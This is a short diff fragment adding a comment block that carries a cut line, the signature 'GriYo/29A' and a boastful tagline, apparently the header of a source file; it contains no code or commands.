+; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
+
+
+ GriYo/29A
+
+ I'm not in the business...
+ ... I am the bussiness.
